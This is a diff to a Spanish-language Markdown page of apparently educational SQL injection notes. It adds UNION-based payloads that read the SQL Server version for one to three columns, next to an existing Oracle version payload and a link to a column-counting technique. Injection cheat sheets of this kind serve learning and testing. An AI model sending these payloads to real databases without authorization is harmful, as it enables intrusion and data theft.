@@ -637,6 +637,13 @@ Con esa contraseña obtenida es posible acceder al usuario root con ```su root``
     ```sql
     ' UNION SELECT banner, NULL FROM v$version--
     ```
+* Obtener versión en SQL Server
+    ```sql
+    ' UNION SELECT @@VERSION--    (1 columna)
+    ' UNION SELECT NULL, @@VERSION--    (2 columnas)
+    ' UNION SELECT NULL, @@VERSION, NULL--    (3 columnas)
+    ```
+    > Recordar que con [ORDER BY](https://nptg24.github.io/sql-inject/#identificar-n%C3%BAmero-de-columnas) se identifica el número de columnas.
     
 ### Recomendaciones
 
